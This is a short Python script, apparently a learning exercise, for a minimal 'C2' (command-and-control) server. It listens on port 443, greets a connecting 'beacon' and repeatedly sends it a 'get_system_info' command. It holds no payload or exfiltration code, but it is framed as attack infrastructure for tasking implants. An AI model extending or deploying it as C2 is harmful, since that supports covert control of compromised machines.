# idk

# c2_server/server.py
import socket

print("🚀 Serveur C2 Ultra Simple")
print("📡 En attente sur le port 443...")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 443))
server.listen(5)

while True:
    client, addr = server.accept()
    print(f"🎯 NOUVEAU CLIENT: {addr}")
    
    # Recevoir le message du beacon
    message = client.recv(1024)
    print(f"📨 Client dit: {message.decode()}")
    
    # Répondre
    client.send(b"Bienvenue! Je suis le C2.")
    print("📤 Réponse envoyée")
    
    # Laisser la connexion ouverte pour la communication
    try:
        while True:
            # Envoyer une commande de test
            client.send(b"get_system_info")
            response = client.recv(1024)
            print(f"📥 Réponse: {response.decode()}")
            
            # Attendre 5 secondes
            import time
            time.sleep(5)
            
    except:
        print("🔌 Client déconnecté\n")
        client.close()
